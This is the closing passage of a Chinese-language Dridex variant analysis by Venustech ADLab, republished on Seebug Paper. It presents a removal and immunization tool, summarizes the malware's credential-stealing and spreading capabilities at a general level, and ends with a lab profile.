在深入分析了该变种蠕虫后，启明星辰ADLab推出了一款Dridex最新变种的简易专杀工具（下载链接：<http://adlab.venustech.com.cn/list.html?type=security_tools>）。该工具可有效地清除机器中的Dridex最新变种，工具主界面如下：

![](https://images.seebug.org/content/images/2018/01/2723c72c-2c13-45ad-871c-9dc7773e4130.png-w331s)
图6-1 专杀工具主界面

使用时，可先点击扫描按钮，如果当前主机感染上了该变种Dridex，便会出现如下提示：

![](https://images.seebug.org/content/images/2018/01/3bcb91d8-a72c-463a-907d-d073c96f9f4a.png-w331s)
图6-2 扫描

然后可对其进行查杀。点击查杀按钮后，可对新型的Dridex变种进行有效查杀。

![](https://images.seebug.org/content/images/2018/01/6113652f-1fef-4bbc-9760-28df83146385.png-w331s)
图6-3 查杀

此外，通过对Dridex新型变种的分析，我发现该变种存在可免疫漏洞，通过创建特定目录可以实现有效的免疫，即使工具退出运行后也能长期起到很好的免疫作用。

![](https://images.seebug.org/content/images/2018/01/7966f123-84d0-464f-8488-5035edd6fdee.png-w331s)
图6-4 开启免疫功能

#### 七、总结

Dridex在经历多年的发展进化后，已经形成了集蠕虫、僵尸、窃密木马、勒索软件、P2P代理于一身的混合型蠕虫病毒。该蠕虫同时具备内外网扩散、正反馈的闭环感染、C&C服务器及通信流量隐藏、对抗分析、快速变异、模块化等高级能力。在窃密功能上，它不仅可窃取各种主流邮件客户端以及浏览器保存的登录凭证(账号和密码信息)，还会收集银行、信用卡等相关登录和支付凭证，危害极大，曾经在欧美造成过巨大影响并且直接导致银行和用户巨大的经济损失。近几年来看，已有相当一部分中国用户受到感染并且有部分中国IP被作为窃密数据回传的中间服务器（Dridex的P2P代理节点），因此需要各企业单位及个人用户提高警惕。

* * *

**启明星辰积极防御实验室（ADLab）**

ADLab成立于1999年，是中国安全行业最早成立的攻防技术研究实验室之一，微软MAPP计划核心成员。截止目前，ADLab通过CVE发布Windows、Linux、Unix等操作系统安全或软件漏洞近400个，持续保持国际网络安全领域一流水准。实验室研究方向涵盖操作系统与应用系统安全研究、移动智能终端安全研究、物联网智能设备安全研究、Web安全研究、工控系统安全研究、云安全研究。研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。
![](https://images.seebug.org/content/images/2017/05/adlab.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/509/>

